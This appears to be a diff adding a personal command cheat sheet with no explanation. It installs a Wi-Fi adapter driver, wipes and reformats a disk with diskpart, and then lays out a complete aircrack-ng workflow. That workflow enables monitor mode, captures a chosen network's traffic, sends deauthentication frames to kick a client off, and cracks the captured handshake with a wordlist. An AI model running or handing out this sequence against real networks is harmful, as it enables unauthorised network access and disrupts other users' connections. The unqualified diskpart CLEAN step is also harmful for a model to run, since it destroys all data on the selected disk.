@@ -1,0 +1,26 @@
+apt install realtek-rtl88xxau-dkms
+
+diskpart
+list disk
+select disk 1
+CLEAN
+CREATE PARTITION PRIMARY
+ACTIVE
+FORMAT FS=NTFS QUICK
+ASSIGN
+EXIT
+
+
+sudo apt-get install aircrack-ng
+iwconfig
+sudo ifconfig wlan0 down      # Replace wlan0 with your interface name
+sudo airmon-ng check kill     # Kill conflicting processes
+sudo airmon-ng start wlan0    # Enable monitor mode
+
+sudo airodump-ng wlan0mon
+
+sudo airodump-ng --bssid <BSSID> --channel <channel> --write <filename> wlan0mon
+
+sudo aireplay-ng --deauth 10 -a <BSSID> -c <client_mac> wlan0mon
+
+sudo aircrack-ng -w /path/to/wordlist <filename>.cap
